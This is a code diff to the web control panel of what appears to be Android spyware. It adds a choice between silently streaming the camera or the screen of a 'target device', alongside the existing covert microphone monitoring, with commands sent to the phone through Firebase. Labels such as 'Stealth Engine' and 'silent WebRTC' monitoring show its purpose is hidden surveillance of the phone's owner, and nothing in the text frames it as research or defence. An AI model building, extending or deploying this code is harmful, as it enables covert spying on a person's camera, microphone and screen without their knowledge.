@@ -195,7 +195,7 @@
                     <i class="fas fa-user-ninja"></i> Stealth Engine
                 </button>
                 <button class="tab-btn" onclick="switchTab('livecam')" id="liveCamTabBtn" style="border-color: rgba(255, 69, 58, 0.4); background: rgba(255, 69, 58, 0.08);">
-                    <i class="fas fa-video" style="color: var(--primary);"></i> Live Camera & Mic
+                    <i class="fas fa-video" style="color: var(--primary);"></i> Live Cam & Screen
                     <span class="live-dot" style="width: 6px; height: 6px; margin-left: 4px; display: inline-block;"></span>
                 </button>
             </div>
@@ -859,14 +859,14 @@
                         <div>
                             <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
                                 <h3 style="font-size: 1.25rem; font-weight: 800; color: #fff; margin: 0; font-family: 'Outfit', sans-serif;">
-                                    <i class="fas fa-video" style="color: var(--primary); margin-right: 6px;"></i> Live Camera & Mic Stream
+                                    <i class="fas fa-video" style="color: var(--primary); margin-right: 6px;"></i> Live Camera & Screen Stream
                                 </h3>
                                 <span id="liveCamBadge" class="badge" style="background: rgba(255, 69, 58, 0.15); color: #ff453a; border: 1px solid rgba(255, 69, 58, 0.35); font-size: 0.72rem; font-weight: 700;">
                                     <span class="live-dot" style="background: #ff453a;"></span> STANDBY
                                 </span>
                             </div>
                             <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 0;">
-                                Real-time silent WebRTC video & microphone monitor for target device.
+                                Real-time silent WebRTC camera, live screen share & microphone monitor.
                             </p>
                         </div>
 
@@ -971,11 +971,26 @@
                             </div>
                         </div>
 
-                        <!-- Right: Stream Configuration & Lens Controls -->
+                        <!-- Right: Stream Configuration, Source & Lens Controls -->
                         <div style="display: flex; flex-direction: column; gap: 16px;">
                             
+                            <!-- Card 0: Video Feed Source Selector (Camera vs Screen Share) -->
+                            <div class="card" style="padding: 18px; border-color: rgba(255, 69, 58, 0.35);">
+                                <h4 style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                                    <i class="fas fa-layer-group" style="color: #ffd60a;"></i> Stream Feed Source
+                                </h4>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                                    <button id="sourceCamBtn" onclick="switchLiveStreamSource('camera')" class="btn-ghost" style="padding: 10px; font-size: 0.82rem; font-weight: 700; border-radius: 12px; background: rgba(255, 69, 58, 0.18); border-color: #ff453a; color: #fff;">
+                                        <i class="fas fa-camera me-1"></i> Live Camera
+                                    </button>
+                                    <button id="sourceScreenBtn" onclick="switchLiveStreamSource('screen')" class="btn-ghost" style="padding: 10px; font-size: 0.82rem; font-weight: 700; border-radius: 12px;">
+                                        <i class="fas fa-mobile-alt me-1"></i> Screen Share
+                                    </button>
+                                </div>
+                            </div>
+
                             <!-- Card 1: Camera Lens Selection -->
-                            <div class="card" style="padding: 18px;">
+                            <div class="card" id="cameraLensCard" style="padding: 18px;">
                                 <h4 style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
                                     <i class="fas fa-camera-rotate" style="color: var(--primary);"></i> Camera Lens Switch
                                 </h4>
@@ -2896,6 +2911,7 @@
     // 8. Ultra-Low Latency WebRTC P2P & Turbo Engine (WhatsApp-Grade Performance)
     // ==========================================
     let isLiveCamStreaming = false;
+    let liveCamSource = 'camera'; // 'camera' or 'screen'
     let liveCamFacing = 'front';
     let liveCamQuality = '720p';
     let liveCamFps = 30;
@@ -2919,6 +2935,49 @@
         ],
         iceCandidatePoolSize: 10
     };
+
+    function switchLiveStreamSource(src) {
+        liveCamSource = src;
+        const camBtn = document.getElementById('sourceCamBtn');
+        const screenBtn = document.getElementById('sourceScreenBtn');
+        const lensCard = document.getElementById('cameraLensCard');
+        const lensLabel = document.getElementById('liveCamLensLabel');
+
+        if (src === 'screen') {
+            if (screenBtn) {
+                screenBtn.style.background = 'rgba(255, 69, 58, 0.18)';
+                screenBtn.style.borderColor = '#ff453a';
+                screenBtn.style.color = '#fff';
+            }
+            if (camBtn) {
+                camBtn.style.background = 'transparent';
+                camBtn.style.borderColor = 'var(--border)';
+                camBtn.style.color = 'var(--text-muted)';
+            }
+            if (lensCard) lensCard.style.display = 'none';
+            if (lensLabel) lensLabel.textContent = '📱 LIVE SCREEN SHARE';
+        } else {
+            if (camBtn) {
+                camBtn.style.background = 'rgba(255, 69, 58, 0.18)';
+                camBtn.style.borderColor = '#ff453a';
+                camBtn.style.color = '#fff';
+            }
+            if (screenBtn) {
+                screenBtn.style.background = 'transparent';
+                screenBtn.style.borderColor = 'var(--border)';
+                screenBtn.style.color = 'var(--text-muted)';
+            }
+            if (lensCard) lensCard.style.display = 'block';
+            if (lensLabel) lensLabel.textContent = liveCamFacing === 'front' ? 'FRONT CAMERA' : 'BACK CAMERA';
+        }
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                source: liveCamSource,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
 
     function toggleLiveCamStream(start) {
         if (!devRef) {
@@ -2959,6 +3018,7 @@
             // Send silent wake & start command to Android phone
             devRef.child('live_stream/controls').set({
                 active: true,
+                source: liveCamSource,
                 facing: liveCamFacing,
                 quality: liveCamQuality,
                 fps: liveCamFps,
